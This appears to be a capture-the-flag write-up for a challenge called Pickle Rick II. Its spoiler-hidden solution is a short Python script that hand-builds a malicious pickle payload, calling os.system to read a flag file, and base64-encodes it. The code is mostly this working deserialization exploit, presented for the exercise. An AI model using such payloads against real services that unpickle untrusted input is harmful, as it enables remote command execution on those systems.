# Pickle Rick II
**Category:** misc

**Author:** _Rok0'sBasilisk_

## Description
It's Pickle Riiickkk again! But even smaller! 

## Solution
<details>
 <summary>Reveal Spoiler</summary>
This challenge is the same a pickle rick 1 but 2 bytes less! Solution is same as Pickle Rick I but without the protocol.

Here is a working exploit:
```
import base64

from pickle import PROTO, SHORT_BINUNICODE, GLOBAL, TUPLE1, REDUCE, STOP

golf_payload = \
    GLOBAL + b"os\nsystem\n" + \
    SHORT_BINUNICODE + b"\x05" + b". /f*" + \
    TUPLE1 + \
    REDUCE + \
    STOP

print(base64.b64encode(golf_payload).decode("utf-8"))
```

Note that you need to use `ls` initially, to observe that the flag is in the root dir.
</details>